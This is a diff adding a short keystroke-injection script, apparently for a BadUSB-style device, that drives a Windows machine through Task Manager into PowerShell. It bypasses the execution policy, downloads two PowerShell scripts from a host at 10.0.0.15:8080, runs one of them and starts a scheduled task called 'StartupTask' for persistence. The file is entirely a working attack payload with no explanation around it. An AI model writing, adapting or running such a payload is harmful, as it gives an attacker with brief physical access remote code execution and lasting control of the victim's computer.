@@ -1,0 +1,39 @@
+CTRL SHIFT ESC
+WAIT 2000
+LED G
+ALT N
+WAIT 2000
+LED G
+TYPE powershell 
+WAIT 2000
+LED G
+TAB
+LED G
+SPACE
+LED G
+ENTER
+LED G
+WAIT 2000
+TYPE Set-ExecutionPolicy Bypass  
+ENTER
+WAIT 2000
+LED G
+TYPE Y
+ENTER
+WAIT 2000
+TYPE Invoke-WebRequest "http://10.0.0.15:8080/important.ps1" -OutFile "C:\windows\Temp\important.ps1"
+WAIT 2000
+ENTER
+LED G
+TYPE Invoke-WebRequest "http://10.0.0.15:8080/scheduled_task.ps1" -OutFile "C:\windows\Temp\scheduled_task.ps1"
+WAIT 2000
+ENTER
+LED G
+TYPE powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\scheduled_task.ps1
+WAIT 2000
+ENTER
+LED G
+TYPE Start-ScheduledTask -TaskName "StartupTask"
+ENTER
+LED G
+WAIT 2000
